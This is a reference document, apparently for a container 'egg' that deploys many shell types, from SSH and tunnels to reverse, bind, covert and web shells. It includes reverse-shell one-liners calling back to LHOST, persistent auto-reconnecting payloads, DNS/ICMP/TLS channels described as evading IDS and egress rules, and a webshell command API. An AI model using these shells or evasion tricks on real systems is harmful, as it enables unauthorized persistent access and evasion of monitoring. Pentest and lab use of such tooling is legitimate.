# SHELLs.md - The Complete Shell Reference

**Multi-Shell Universal Egg** · PotenFYR Studios · every shell type, tested in real container boots.

This document is the human reference for every shell the egg serves. Each entry shows:
what it is, when to use it, the **exact external connection commands**, and the **key components** explained. The same guides are printed to your server console at boot.

> Legal: shells are dual-use tools. Only deploy on systems you own or are explicitly authorized to test.

---

## How the egg picks ports (panels + Docker)

| Environment | Primary shell binds | Extra ported shells |
|---|---|---|
| Pterodactyl / Pelican / Feather / Wisp | `SERVER_PORT` (the panel-allocated port) | `SHELL_EXTRA_PORTS` positionally |
| Docker / standalone | `SERVER_PORT` (set it yourself, default 8888) | `SHELL_EXTRA_PORTS`, then `+10` steps |

- The **first ported shell always takes the primary container port** - one port is all you must allocate.
- Multiplexers (tmux/screen/zellij) and outbound reverse shells need **no** inbound port.
- Always allocate/forward the printed ports in your panel firewall or `docker run -p`.

---

## 1. Server / incoming management shells

### `ssh` - OpenSSH Server
Hardened-by-default sshd: passwords **and** keys, SFTP included, persistent host identity.
```
ssh -p <PORT> <user>@<host>          # password or key login
sftp -P <PORT> <user>@<host>         # file transfer, same auth
ssh-keyscan -p <PORT> <host> >> ~/.ssh/known_hosts   # pin host key first
```
Key components: `Port` = panel port; users come from `SHELL_USERS` (auto-generated passwords land in `.env` + console); `internal-sftp` serves SFTP without extra binaries.

### `ssh-cert` - OpenSSH CA Certificates 🔐
The egg generates a **container-local certificate authority** and signs:
- a **host certificate** (server proves its identity - no more blind host-key prompts),
- a **user certificate per plan user** (client proves identity - no passwords, no authorized_keys).
```
# operator: pull the CA public key from the server (.ssh-ca/ca_user_key.pub)
ssh-keygen -t ed25519 -f mykey                       # your personal key
ssh-keygen -s ca_user_key -I me -n <user> -V +52w mykey.pub
ssh -i mykey -o CertificateFile=mykey-cert.pub -p <PORT> <user>@<host>
```
Key components: `TrustedUserCAKeys` (sshd trusts any cert signed by the CA), principals (`-n` - the ONLY usernames the cert may log in as), `HostCertificate` + client-side `@cert-authority` pinning, validity windows (`-V`). Verified in CI: cert login succeeds, a cert for `carol` logging in as `mallory` is rejected.

### `ssh-hardened` - Keys-only Fortress
```
ssh -p <PORT> -i ~/.ssh/id_ed25519 <user>@<host>
```
Key components: `AuthenticationMethods publickey` (passwords impossible), modern ciphers only (`chacha20-poly1305`, `aes-gcm`), `MaxAuthTries 2`, forwarding disabled. Seed your key via `SHELL_SSH_PUBKEY_RAW` or the panel file manager into `.ssh-pub/authorized_keys`.

### `dropbear` - Tiny SSH
Same connection shape as `ssh`. Key components: single small binary for low-RAM containers, ECC host keys, `-E -F` foreground logging into the supervisor.

### `telnetd` - Classic Telnet
```
telnet <host> <PORT>
login: <user>   Password: <pass>
```
Key components: RFC854 IAC negotiation, auth against `/etc/shadow` (SHA-512; verified by stdlib crypt or the openssl fallback), PTY bash after login. **Plaintext - lab use only.**

### `mosh-server` - Mosh (roaming shell)
```
mosh --port=60000 <user>@<host>       # UDP 60000-60010 must be open
```
Key components: SSP over UDP, survives IP changes/sleep, instant local echo.

### `tmux` / `screen` / `zellij` - Multiplexers
```
tmux attach -t shell-eggs            # after any ssh/telnet login
```
Key components: detached server process survives disconnects; `DEFAULT_SHELL_MUX=tmux` drops every login user straight into the session.

---

## 2. SSH tunnels & forwarding

All tunnel modes share the tunnel sshd (GatewayPorts on, forwarding allowed, no root login).

### `ssh-local` - Local forward (`-L`)
```
ssh -p <PORT> -N -L 8080:target.host:80 <user>@<host>
# now: http://localhost:8080 → target.host:80 *from the container*
```
Components: `-N` no shell; `-L <local>:<dest>` your machine's port tunnels to a destination reachable **by the container**.

### `ssh-remote` - Remote forward (`-R`)
```
ssh -p <PORT> -N -R 9090:internal.host:80 <user>@<host>
# now: container:9090 → internal.host:80 *from your machine*
```
Components: `-R` opens the listening port on the remote (this container); `GatewayPorts yes` allows non-localhost binds.

### `ssh-dynamic` - SOCKS5 proxy (`-D`)
```
ssh -p <PORT> -N -D 1080 <user>@<host>
curl --socks5 127.0.0.1:1080 https://ifconfig.me    # exits via the container
```
Components: `-D` = dynamic forward, a full SOCKS5 server on your box; route a whole browser through it.

### `ssh-x11` - X11 forwarding
```
ssh -p <PORT> -X <user>@<host>       # then run: xeyes
```
Components: `-X` forwards the X channel; `-Y` = trusted (faster, weaker isolation).

### `rsync-ssh` - Delta sync
```
rsync -avz -e 'ssh -p <PORT>' ./folder/ <user>@<host>:~/dest/
```
Components: `-a` archive, `-z` wire compression, delta algorithm ships only changed blocks.

### `sshfs` - Mount the container locally
```
sshfs -p <PORT> <user>@<host>:/home/container ./mnt   # unmount: fusermount -u ./mnt
```
Components: filesystem-over-SFTP; everything stays encrypted in transit.

---

## 3. Reverse shells - plain channel (container → your listener)

**Your listener first** on `<LHOST>:<LPORT>` (default 4444, set `SHELL_REVERSE_HOST/PORT`):
```
nc -lvnp 4444                                   # plain
socat file:$(tty),raw,echo=0 TCP-L:4444         # fully interactive PTY listener
```

| id | one-liner essence |
|---|---|
| `bash-tcp` | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
| `bash-udp` | `bash -i >& /dev/udp/...` (listener: `nc -lu`) |
| `python` | socket + dup2 + subprocess, reconnect loop |
| `python-pty` | same but `pty.spawn` - full TTY on your side |
| `php` | `fsockopen` + `proc_open('/bin/bash -i')` |
| `php-pentest` | full pentestmonkey-style script (write file, cwd, magic quotes off) |
| `perl` | core `Socket` + `exec /bin/sh -i` |
| `ruby` | `TCPSocket` + `system` |
| `lua` | `io.popen` loop over received lines |
| `node` | `net.connect` + `child_process.spawn` |
| `powershell` | `System.Net.Sockets.TCPClient` + `Invoke-Expression` |
| `golang` | `net.Dial` source compiled at boot (`go build`) |
| `groovy` | Jenkins-console style `Socket` + `ProcessBuilder` |
| `java` | plain `Socket` + `ProcessBuilder`, compiled at boot |
| `awk` | gawk `/inet/tcp` co-process (yes, really) |
| `nc` | FIFO relay - works with openbsd AND traditional netcat |
| `nc-udp` | UDP flavor (send one byte first to open the hole) |
| `ncat` | nmap's `ncat --exec /bin/sh` |
| `socat` | `EXEC:...,pty,stderr,setsid,sigint,sane` - the gold standard |
| `cryptcat` | netcat + twofish (`-k <shared-key>`) |

Every payload **reconnects forever** (2–5s backoff) and is auto-restarted by the supervisor.

## 4. Secure / covert reverse shells (TLS-first)

| id | connect / listen |
|---|---|
| `openssl-rs` | you: `socat file:$(tty),raw,echo=0 OPENSSL-LISTEN:4444,cert=server.pem,verify=0` - container: `openssl s_client -quiet -connect` |
| `socat-tls` | auto-generated client cert; you listen with `OPENSSL-LISTEN,cert=…` |
| `ncat-ssl` | `ncat --ssl --exec /bin/sh LHOST LPORT`; you: `ncat --ssl -l -p 4444 --allow LHOST` |
| `wssh` | websocket-framed shell - passes as web traffic; listener snippet in `payloads/wssh.py` header |
| `dnscat` | DNS TXT-channel client; pair with dnscat2 server (needs NS record pointing at you) |
| `icmp-shell` | shell inside ping payloads; needs `--cap-add NET_RAW`; root listener required |

Key components explained: TLS stops IDS payload inspection (fingerprints still visible - pin certs!); DNS/ICMP channels walk through "only-DNS/only-ICMP" egress rules.

## 5. Bind shells (attacker connects IN)

| id | connect from outside |
|---|---|
| `nc-bind` | `nc <host> <PORT>` |
| `socat-bind` | `socat file:$(tty),raw,echo=0 TCP:<host>:<PORT>` (full PTY) |
| `openssl-bind` | `socat file:$(tty),raw,echo=0 OPENSSL:<host>:<PORT>,verify=0` - TLS, self-signed pair auto-generated (`certs/bind.{key,crt}` - pin the fingerprint) |
| `php-bind` | `nc <host> <PORT>`, one command per line |
| `python-bind` | `nc <host> <PORT>` - real PTY per client, multi-operator |

## 6. Web / browser shells

| id | connect |
|---|---|
| `ttyd` | browser → `http://<host>:<PORT>` - full xterm.js; `-W` writable; basic-auth defaults to first generated user |
| `gotty` | browser → `http://<host>:<PORT>` - Go static binary alternative |
| `php-webshell` | `curl "http://<host>:<PORT>/?token=<TOKEN>&cmd=id"` - token REQUIRED (401 otherwise) |
| `node-webshell` | same API, Node runtime, 30s exec timeout |

## 7. Debugging shells

| id | what you get |
|---|---|
| `ssh-debug` | foreground `sshd -ddd` + `ssh -vvv` recipe; auth attempts streamed to console |
| `strace-shell` | login shell that traces every syscall of the session into `logs/` |
| `tcpdump-shell` | session companion that captures `.pcap` for offline review |
| `socat-probe` | raw TCP relay with hex dump - inspect any protocol live |

---

## Startup variables (egg JSON)

| Variable | Default | Notes |
|---|---|---|
| `SHELL_TYPE` | `auto` | comma-separated ids, or `auto` for the interactive picker |
| `SHELL_EXTRA_TYPES` | - | additional shells beyond the primary |
| `SHELL_USERS` | - | comma list; **credentials are the only mandatory input** |
| `SHELL_PASSWORDS` | `auto` | positional; `auto` slots generate crypto-random secrets |
| `SHELL_EXTRA_PORTS` | - | positional ports for extra ported shells |
| `SHELL_REVERSE_HOST/PORT` | `4444` | where reverse shells call back |
| `SHELL_SSH_PUBKEY_RAW` | - | seed authorized_keys (hardened profile) |
| `SHELL_WEB_USER/PASS/TOKEN` | generated | web shell auth (optional) |
| `AUTO_GENERATE_CREDENTIALS` | `1` | everything optional except credentials |
| `CLI_THEME` / `CLI_BANNER_GRADIENT` | `sh` / `auto` | console cosmetics |

Full catalog: `scripts/shell-registry.sh` · runtime: `run.sh` · website: `/docs`
